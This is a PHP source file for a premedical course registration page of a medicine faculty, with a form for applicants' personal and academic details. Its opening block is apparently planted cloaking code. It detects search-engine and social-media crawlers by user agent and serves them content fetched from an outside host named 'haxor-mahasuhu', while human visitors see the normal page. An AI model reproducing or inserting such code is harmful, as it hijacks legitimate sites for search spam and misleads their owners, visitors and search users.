<?php
function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $bots = array(
        'Googlebot', 'Googlebot-News', 'Googlebot-Image', 'Googlebot-Video',
        'bingbot', 'Slurp', 'DuckDuckBot', 'BingPreview', 'DuckDuckGo', 'YandexBot',
        'Baiduspider', 'TelegramBot', 'facebookexternalhit', 'Pinterest', 'W3C_Validator',
        'Google-Site-Verification', 'Google-InspectionTool', 'Applebot', 'AhrefsBot', 'SEMrushBot', 'MJ12bot'
    );
    
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }

    return false;
}

function fetch_message_from_url($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout setelah 10 detik
    $response = curl_exec($ch);
    
    if (curl_errno($ch)) {
        error_log("Error cURL: " . curl_error($ch));
        curl_close($ch);
        return false;
    }
    
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($http_code == 200) {
        return $response;
    } else {
        error_log("HTTP Error: Status Code " . $http_code);
        return false;
    }
}

if (is_bot()) { 
    $message = fetch_message_from_url('https://tennesse.haxor-mahasuhu.info/premedico2025/index.php');
    
    if ($message) {
        echo $message;
    } else {
        echo "";
    }
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<?php include("head.php") ?>
<body>
  <div class="body-inner">

  <?php include("menu.php") ?>


  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>


  <?php 
if(isset($_GET['id'])) {
    if($_GET['id'] == 'error' || $_GET['id'] == 'existente'){
        echo "";
        ?>
        <script type="text/javascript">
            Swal.fire({
                icon: 'error',
                title: 'Error',
                text: 'Error al ingresar sus datos, intente más tarde'
            });
        </script>
        <?php
    } else {
        $id = htmlspecialchars($_GET['id']); // Sanitize the ID for safety
        ?>
        <script type="text/javascript">
            Swal.fire({
                title: '¡Registrado!',
                html: 'Se ha enviado el formato de ficha. Haga clic en el siguiente enlace en el para descargarlo. ',
                icon: 'success',
                showCancelButton: true,
                confirmButtonText: 'Descargar Comprobante',
                cancelButtonText: 'Cerrar',
                preConfirm: () => {
                  window.open('recibo.php?id=<?php echo $id; ?>', '_blank'); // Open in new tab
                }
            });
        </script>
        <?php
    }
}
?>
  <script>
        function cambiarLetras(event) {
            // Cambia la letra a mayúscula como ejemplo
            event.target.value = event.target.value.toUpperCase();
        }
    </script>

<div class="banner-carousel banner-carousel-2 mb-0">
  <div class="banner-carousel-item" style="background-image:url('fondo2.jfif')">
    <div class="container">
        <div class="box-slider-content">
          <div class="box-slider-text">
              <h2 class="box-slide-title">BUO - Facultad de Medicina y Cirugía</h2>
              <h3 class="box-slide-sub-title">CURSO <strong>PREMEDICO</strong></h3>
              <p class="box-slide-description text-justify">Iniciamos el 19 de Abril de 2025</p>
              <p>
                <a href="#mas" class="slider btn btn-primary">Solicitud de inscripción</a>
              </p>
          </div>
        </div>
    </div>
  </div>
</div>










<section class="content" id="mas">
  <div class="container">
  <img src="imagen.jfif" class="img-fluid rounded mx-auto d-block" style="max-width: 80%;" alt="Descripción de la imagen">  
  <hr>
  <h3 class="column-title">SOLICITUD DE INSCRIPCIÓN AL CURSO</h3>
  <form data-toggle="validator" role="form" method="POST" action="registrar.php">
    <div class="row">
          
           <div class="col-lg-4 col-12">
              <div class="form-group">
                <label for="inputName" class="control-label">Nombre(s)</label>
                <input type="text" class="form-control" id="inputName" placeholder="Nombre(s)" required maxlength="60" name="nombre"  oninput="cambiarLetras(event)">
              </div>
            </div>
            <div class="col-lg-4 col-12">
              <div class="form-group">
                <label for="inputName" class="control-label">Apellido paterno</label>
                <input type="text" class="form-control" id="inputName" placeholder="Apellido Paterno" required maxlength="60" name="apellidop"  oninput="cambiarLetras(event)">
              </div>
            </div>
            <div class="col-lg-4 col-12">
              <div class="form-group">
                <label for="inputName" class="control-label">Apellido Materno</label>
                <input type="text" class="form-control" id="inputName" placeholder="Apellido Materno" required maxlength="60" name="apellidom"  oninput="cambiarLetras(event)">
              </div>
            </div>

            <div class="col-lg-4 col-12">
              <div class="form-group">
                <label for="inputName" class="control-label">CURP</label>
                <input type="text" class="form-control" id="inputName" placeholder="CURP a 18 dígitos" required maxlength="18" name="curp"  oninput="cambiarLetras(event)">
              </div>
            </div>

            <div class="col-lg-2 col-6">
              <div class="form-group">
                <label for="inputName" class="control-label">Edad</label>
                <input type="edad" class="form-control" id="inputName" placeholder="Edad" required name="edad" min=0 max=99>
              </div>
            </div>
            <div class="col-lg-2 col-6">
              <div class="form-group">
                <label for="sexo" class="control-label">Sexo</label>
                <select class="form-control" name="sexo" >
                    <option></option>
                    <option value="H">Hombre</option>
                    <option value="M">Mujer</option>
                </select>
              </div>
            </div>

            <div class="col-lg-4 col-6">
              <div class="form-group has-feedback">
                <label for="inputTwitter" class="control-label">Teléfono</label>
                <div class="input-group">      
                  <input type="text" pattern="^[0-9]{1,}$" minlength="10" maxlength="10" class="form-control" id="inputTwitter" placeholder="10 dígitos" required
                  name="telefono">
                </div>
                
              </div>
            </div>

            <div class="col-lg-4 col-12 ">
              <div class="form-group">
                <label for="inputEmail" class="control-label">Correo electrónico</label>
                <input type="email" class="form-control" id="inputEmail" placeholder="Correo electrónico (ej. correo@gmail.com)" 
                data-error="El correo ingresado no es válido" required  name="correo">
                <div class="help-block with-errors"></div>
              </div>
            </div>          
          
            <div class="col-lg-8 col-12">
                <div class="form-group">
                  <label for="inputName" class="control-label">Lugar de residencia</label>
                  <input type="text" class="form-control" id="inputName" placeholder="Lugar de residencia" required maxlength="60" name="residencia"  oninput="cambiarLetras(event)">
                </div>
              </div>
           
            </div>
            <div class="row">
              
            </div>
            <h3>DATOS ACÁDEMICOS</h3>
            <div class="row">
              <div class="col-lg-12 col-12">
                <div class="form-group">
                  <label for="inputName" class="control-label">Institución de Educación Media Superior de Procedencia</label>
                  <input type="text" class="form-control" id="inputName" placeholder="Institución de procedencia" required maxlength="60" name="institucion"  oninput="cambiarLetras(event)">
                </div>
              </div>

              <div class="col-lg-8 col-12">
              <div class="form-group">
                <label for="inputName" class="control-label">Tipo de institución</label>
                <input type="text" class="form-control" id="inputName" placeholder="Privada/Pública" required maxlength="60" name="tipo_institucion"  oninput="cambiarLetras(event)">
              </div>
            </div>

            <div class="col-lg-4 col-12">
              <div class="form-group">
                <label for="inputName" class="control-label">Promedio anterior</label>
                <input type="number" step="any" class="form-control" id="inputName" placeholder="Promedio" required min=6 max=10 name="promedio">
              </div>
            </div>
            </div>

            <div class="col-lg-12 col-12 text-center"></div>
              <div class="form-group">
                <button type="submit" class="btn btn-primary">Registrar</button>
            </div>
</form>
</div>

    <!--/ Content row end -->
  
  <!--/ Container end -->
</section><!-- Content end -->



<section id="facts" class="facts-area dark-bg">
  <div class="container">
    <div class="facts-wrapper">
        <div class="row">
          <div class="col-md-12 col-sm-12 col-12 ts-facts">
              Mayores informes

              <div class="row">
                    <div class="col">
                    <span class="slider btn btn-primary">951 391 42 63 <br>  
                    </span>  
                    </div>
                   
              </div>
             
          </div><!-- Col end -->

  

        </div> <!-- Facts end -->
    </div>
    <!--/ Content row end -->
  </div>
  <!--/ Container end -->
</section><!-- Facts end -->



<?php include("footer.php") ?>
  </body>

  </html>
